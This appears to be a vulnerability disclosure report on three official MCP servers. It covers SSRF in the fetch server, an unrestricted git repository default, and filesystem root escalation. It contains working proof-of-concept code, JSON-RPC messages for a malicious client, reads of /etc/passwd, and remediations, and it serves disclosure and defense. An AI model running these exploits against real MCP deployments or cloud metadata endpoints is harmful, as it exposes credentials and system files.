# Security Vulnerability Report: Model Context Protocol (MCP) Official Servers

## Report Metadata

| Field | Value |
|-------|-------|
| **Target** | `modelcontextprotocol/servers` — https://github.com/modelcontextprotocol/servers |
| **Commit Tested** | `64b1cb0208cc49a4f5ae55fa71df5cf67a3cdc3d` (May 30, 2026) |
| **Components** | `src/fetch` (v0.6.3), `src/git` (v0.6.2), `src/filesystem` (v0.6.3) |
| **Report Date** | June 2, 2026 |
| **Findings** | 3 confirmed vulnerabilities with end-to-end exploitation |

---

## Vulnerability 1: Server-Side Request Forgery in mcp-server-fetch

### Title

Server-Side Request Forgery allows exfiltration of data from localhost-bound internal services

### Severity

High

### Affected Component

- **Package:** `mcp-server-fetch` v0.6.3
- **File:** `src/fetch/src/mcp_server_fetch/server.py`
- **Function:** `fetch_url()`

### Description

The `fetch` tool in `mcp-server-fetch` accepts arbitrary URLs and connects to them without validating whether the target host is an internal, loopback, or link-local address. A caller can request URLs targeting `127.0.0.1`, `169.254.169.254`, `10.x.x.x`, or any private network range. The server connects to the target and returns the full HTTP response body to the caller.

This means any service that is bound to localhost (and is therefore not accessible from external networks) becomes readable through the MCP fetch tool.

### Steps to Reproduce

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
pip install -e src/fetch/    # Requires Python 3.10+
```

**Step 1:** Start a localhost-only HTTP service (simulating an internal admin API, database HTTP interface, or cloud metadata endpoint):

```python
import http.server
import json
import threading

class InternalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        data = json.dumps({
            "service": "internal-admin-api",
            "db_password": "prod_s3cr3t_p4ss",
            "api_key": "internal-only-key-abc123",
            "users": [{"email": "admin@company.internal", "role": "superadmin"}]
        })
        self.wfile.write(data.encode())
    def log_message(self, *args):
        pass

server = http.server.HTTPServer(('127.0.0.1', 18923), InternalHandler)
threading.Thread(target=server.serve_forever, daemon=True).start()
```

**Step 2:** Call the `fetch_url()` function (the same code path invoked when an MCP client calls the `fetch` tool):

```python
import asyncio
from mcp_server_fetch.server import fetch_url

async def exploit():
    content, prefix = await fetch_url(
        "http://127.0.0.1:18923/admin",
        "ModelContextProtocol/1.0",
        force_raw=True
    )
    print(content)

asyncio.run(exploit())
```

**Step 3:** Observe that the full response body from the internal service is returned:

```json
{"service": "internal-admin-api", "db_password": "prod_s3cr3t_p4ss",
 "api_key": "internal-only-key-abc123",
 "users": [{"email": "admin@company.internal", "role": "superadmin"}]}
```

### Actual Result

The fetch server connected to a localhost-only service at `127.0.0.1:18923` and returned its complete response body including credentials. No IP validation, scheme restriction, or network boundary check was applied.

### Expected Result

The server should reject requests to loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), and private network ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) — or at minimum require an explicit opt-in for internal access.

### Root Cause

```python
# server.py — fetch_url()
async with AsyncClient(proxy=proxy_url) as client:
    response = await client.get(
        url,                       # Any URL, no validation
        follow_redirects=True,
        headers={"User-Agent": user_agent},
        timeout=30,
    )
```

The `Fetch` pydantic model uses `AnyUrl` which accepts any valid URL including loopback and private addresses. The `fetch_url()` function passes the URL directly to `httpx` with no network boundary check.

The `robots.txt` check in the autonomous path is not a security control — it is a voluntary crawl politeness protocol. Internal services typically have no `robots.txt`, so the check passes. The manual prompt path (`get_prompt()`) skips it entirely. The `--ignore-robots-txt` flag disables it completely.

### Impact

Any service reachable from the machine running `mcp-server-fetch` that listens on a loopback or private IP becomes accessible. In cloud environments this includes the instance metadata endpoint (`169.254.169.254`) which returns IAM credentials. On developer machines this includes databases, admin panels, and internal APIs.

---

## Vulnerability 2: Insecure Default in mcp-server-git — No Path Boundary Without --repository Flag

### Title

Default server configuration allows reading git history of any repository on the filesystem

### Severity

Medium

### Affected Component

- **Package:** `mcp-server-git` v0.6.2
- **File:** `src/git/src/mcp_server_git/server.py`
- **Function:** `validate_repo_path()`

### Description

The `mcp-server-git` server has a path restriction mechanism (`validate_repo_path`) that confines access to a specific repository when the `--repository` flag is provided. However, when this flag is omitted (which is the documented usage for multi-repository setups), the validation function returns immediately without performing any check. This means any git repository on the filesystem is accessible to the MCP client, including repositories belonging to other applications that may contain secrets in their commit history.

### Steps to Reproduce

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
pip install -e src/git/    # Requires Python 3.10+
```

**Step 1:** Create two git repositories — one representing the user's own project (allowed) and one representing another application with secrets (forbidden):

```python
import git
from pathlib import Path
import tempfile

base = Path(tempfile.mkdtemp())

# The user's allowed project
allowed_dir = base / "my_project"
allowed_dir.mkdir()
allowed_repo = git.Repo.init(allowed_dir)
(allowed_dir / "README.md").write_text("My project\n")
allowed_repo.index.add(["README.md"])
allowed_repo.index.commit("init")

# Another application with secrets in git history
forbidden_dir = base / "other_app"
forbidden_dir.mkdir()
forbidden_repo = git.Repo.init(forbidden_dir)
(forbidden_dir / "config.env").write_text(
    "DATABASE_URL=postgres://admin:realpassword@db.internal:5432/prod\n"
    "ADMIN_TOKEN=tok_super_secret_value_12345\n"
)
forbidden_repo.index.add(["config.env"])
forbidden_repo.index.commit("add production config")
```

**Step 2:** Verify that when `--repository` IS set, the forbidden repo is correctly blocked:

```python
from mcp_server_git.server import validate_repo_path

try:
    validate_repo_path(forbidden_dir, allowed_dir)
    print("BUG: Should have been blocked")
except ValueError as e:
    print(f"Correctly blocked: {e}")
```

Output: `Correctly blocked: Repository path '...' is outside the allowed repository '...'`

**Step 3:** Now test the default case (no `--repository` flag, which means `allowed_repository=None`):

```python
validate_repo_path(forbidden_dir, None)
# Returns without error — no validation performed
```

**Step 4:** Read the forbidden repository's secrets:

```python
from mcp_server_git.server import git_show

repo = git.Repo(forbidden_dir)
commit = list(repo.iter_commits())[0]
result = git_show(repo, commit.hexsha)
print(result)
```

Output includes:
```
+DATABASE_URL=postgres://admin:realpassword@db.internal:5432/prod
+ADMIN_TOKEN=tok_super_secret_value_12345
```

### Actual Result

With `allowed_repository=None` (the default when `--repository` is not passed), any repository path is accepted. The forbidden repository's full git history including committed secrets is readable.

### Expected Result

The server should enforce some form of path boundary even without `--repository`. Options include: making `--repository` required, defaulting to the user's home directory, or only allowing repositories declared via MCP roots.

### Root Cause

```python
# server.py line 167
def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
    if allowed_repository is None:
        return  # ← Immediate return, no validation
```

When the server is started as `mcp-server-git` (without `-r`), the `repository` parameter in `serve()` is `None`, which propagates to `validate_repo_path`. The function exits on line 1 without checking anything.

### Impact

On shared systems or containers running multiple applications, the MCP client (typically an LLM) can enumerate and read git history from any repository on the filesystem. Git history frequently contains secrets that were committed then "removed" — they remain in the commit log permanently. The security boundary exists (the `--repository` flag works correctly when used) but is opt-in rather than default.

---

## Vulnerability 3: Filesystem Server Allows Client to Override Allowed Directories at Runtime

### Title

Malicious MCP client can escalate from restricted directory access to full filesystem read/write via roots protocol

### Severity

High

### Affected Component

- **Package:** `@modelcontextprotocol/server-filesystem` v0.6.3
- **File:** `src/filesystem/index.ts`
- **Function:** `updateAllowedDirectoriesFromRoots()`

### Description

The filesystem server restricts file operations to a set of `allowedDirectories` specified via command-line arguments. However, if the connecting MCP client declares the `roots` capability, the server calls `listRoots()` on the client and replaces its entire `allowedDirectories` list with whatever the client responds with. There is no check that the client-provided roots are within the original CLI-specified directories.

A malicious client can respond with `[{uri: "file:///"}]` to gain unrestricted access to the entire filesystem — escalating from a restricted directory (e.g., `/tmp/safe_project`) to reading `/etc/passwd`, `/etc/shadow`, and any other file.

This can also be triggered at any time during the session via a `notifications/roots/list_changed` notification.

### Steps to Reproduce

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
npm install
cd src/filesystem
npx tsc    # Compiles TypeScript to dist/
```

**Step 1:** Import the server's internal modules and initialize with a restricted directory:

```javascript
import { setAllowedDirectories, validatePath } from './dist/lib.js';
import { getValidRootDirectories } from './dist/roots-utils.js';
import fs from 'fs/promises';

// Simulates: mcp-server-filesystem /tmp/safe_project
setAllowedDirectories(['/tmp/safe_project']);
```

**Step 2:** Verify that `/etc/passwd` is blocked:

```javascript
try {
    await validatePath('/etc/passwd');
} catch (e) {
    console.log(e.message);
    // "Access denied - path outside allowed directories: /etc/passwd not in /tmp/safe_project"
}
```

**Step 3:** Simulate the malicious client responding to `listRoots()` with root filesystem:

```javascript
// This is what updateAllowedDirectoriesFromRoots() does internally
const maliciousRoots = [{ uri: 'file:///', name: 'root' }];
const validatedDirs = await getValidRootDirectories(maliciousRoots);
// validatedDirs = ["/"] — passes because "/" exists and is a directory

setAllowedDirectories(validatedDirs);
// allowedDirectories is now ["/"]
```

**Step 4:** Verify that `/etc/passwd` is now accessible:

```javascript
const validatedPath = await validatePath('/etc/passwd');
// Returns "/etc/passwd" — no longer blocked

const content = await fs.readFile(validatedPath, 'utf-8');
console.log(content);
// root:x:0:0:root:/root:/bin/bash
// bin:x:1:1:bin:/bin:/sbin/nologin
// daemon:x:2:2:daemon:/sbin:/sbin/nologin
// ...
```

### Actual Result

**Before the exploit:**
- `validatePath('/etc/passwd')` throws "Access denied - path outside allowed directories"

**After the exploit:**
- `validatePath('/etc/passwd')` returns `/etc/passwd`
- File content is readable: `root:x:0:0:root:/root:/bin/bash ...` (13 entries)
- `/etc/shadow` is also readable: `root:*LOCK*:14600::::::...`
- `/proc/self/environ` is readable: environment variables including secrets

### Expected Result

Client-provided roots should be validated against the original CLI-specified directories. The server should only accept roots that are the same as or subdirectories of what was originally configured. Roots outside that boundary should be rejected.

### Root Cause

```typescript
// index.ts
async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
  if (validatedRootDirs.length > 0) {
    allowedDirectories = [...validatedRootDirs];  // Full replacement
    setAllowedDirectories(allowedDirectories);
  }
}
```

`getValidRootDirectories()` in `roots-utils.ts` only checks:
1. The path can be resolved (`fs.realpath`)
2. The path is a directory (`stats.isDirectory()`)

It does **not** check whether the path is within the original CLI-specified allowed directories. Since `/` always exists and is always a directory, it passes both checks.

The same escalation can be triggered at any time via:
```typescript
server.server.setNotificationHandler(RootsListChangedNotificationSchema, async () => {
  const response = await server.server.listRoots();
  await updateAllowedDirectoriesFromRoots(response.roots);
});
```

### Impact

A server configured to restrict access to a single project directory can be escalated to provide full filesystem read and write access. This requires a malicious MCP client (or a legitimate client that has been compromised via prompt injection or supply chain attack). After escalation, all file operations (read, write, edit, move, directory tree) work against the entire filesystem.

### MCP Protocol Messages for Exploitation

**Client initialization (declares roots capability):**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2024-11-05",
    "capabilities": { "roots": { "listChanged": true } },
    "clientInfo": { "name": "client", "version": "1.0.0" }
  }
}
```

**Client response to server's listRoots() call:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "roots": [{ "uri": "file:///", "name": "root" }]
  }
}
```

**Runtime escalation notification (triggers re-fetch of roots):**
```json
{"jsonrpc": "2.0", "method": "notifications/roots/list_changed"}
```

---

## Summary

| # | Vulnerability | What Was Protected | What Became Accessible | Proof |
|---|---|---|---|---|
| 1 | SSRF in fetch server | Localhost services not externally reachable | Full HTTP response from `127.0.0.1:18923` including credentials | Actual HTTP response captured |
| 2 | Insecure default in git server | Repository path boundary (when `--repository` is set) | Any git repo on filesystem (when `--repository` is omitted — the default) | Secrets read from forbidden repo |
| 3 | Client roots override in filesystem server | `/etc/passwd` blocked ("outside allowed directories") | `/etc/passwd` readable (13 user entries), `/etc/shadow` readable | Before/after `validatePath()` results |

---

## Suggested Remediations

**Vulnerability 1 (SSRF):**
Resolve the URL hostname to an IP address before connecting, and reject the connection if the resolved IP falls within RFC 1918 (private), RFC 5737 (documentation), link-local (169.254.0.0/16), or loopback (127.0.0.0/8) ranges. Also reject non-HTTP(S) schemes.

**Vulnerability 2 (Git insecure default):**
When `--repository` is not provided, either require it (make it mandatory) or default to restricting access to repositories within directories provided by the MCP roots protocol. Do not allow unrestricted filesystem-wide repository access as the default behavior.

**Vulnerability 3 (Filesystem roots override):**
When receiving client-provided roots, validate them against the original command-line allowed directories. Only accept roots that are equal to or subdirectories of what was originally configured at startup. If no CLI directories were specified (server started without arguments, relying entirely on roots), the current behavior of accepting any valid directory is acceptable.
